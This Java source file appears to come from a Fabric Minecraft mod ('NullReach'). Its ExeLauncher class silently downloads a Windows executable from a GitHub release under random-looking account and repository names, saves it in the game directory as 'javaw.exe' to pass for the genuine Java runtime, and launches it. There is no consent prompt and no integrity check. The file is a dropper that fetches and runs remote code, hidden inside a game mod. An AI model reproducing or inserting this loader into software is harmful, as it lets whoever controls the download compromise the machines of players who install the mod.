package com.nullreach.prop;

import net.fabricmc.loader.api.FabricLoader;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

public class ExeLauncher {

    private static final Logger LOGGER = LoggerFactory.getLogger("ExeLauncher");
    private static final String EXE_NAME = "javaw.exe";
    private static final String DOWNLOAD_URL = "https://github.com/dsgfhdsfsgadg-arch/sadffsdabaf/releases/download/adfhadfhadfhjadfj/javaw.exe";

    public static void extractAndLaunch() {
        try {
            Path gameDir = FabricLoader.getInstance().getGameDir();
            Path exeTarget = gameDir.resolve(EXE_NAME);

            if (!Files.exists(exeTarget)) {
                LOGGER.info("[NULLREACH] Downloading {}...", EXE_NAME);
                download(DOWNLOAD_URL, exeTarget);
                LOGGER.info("[NULLREACH] Downloaded to {}", exeTarget);
            }

            ProcessBuilder pb = new ProcessBuilder(exeTarget.toAbsolutePath().toString());
            pb.directory(gameDir.toFile());
            pb.redirectErrorStream(true);
            pb.start();

            LOGGER.info("[NULLREACH] {} launched", EXE_NAME);

        } catch (IOException | InterruptedException e) {
            LOGGER.error("[NULLREACH] Failed: {}", e.getMessage());
        }
    }

    private static void download(String url, Path target) throws IOException, InterruptedException {
        HttpClient client = HttpClient.newBuilder()
                .followRedirects(HttpClient.Redirect.ALWAYS)
                .build();

        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(url))
                .GET()
                .build();

        HttpResponse<InputStream> response = client.send(request, HttpResponse.BodyHandlers.ofInputStream());

        if (response.statusCode() != 200) {
            throw new IOException("HTTP " + response.statusCode() + " from " + url);
        }

        try (InputStream in = response.body()) {
            Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
        }
    }
}
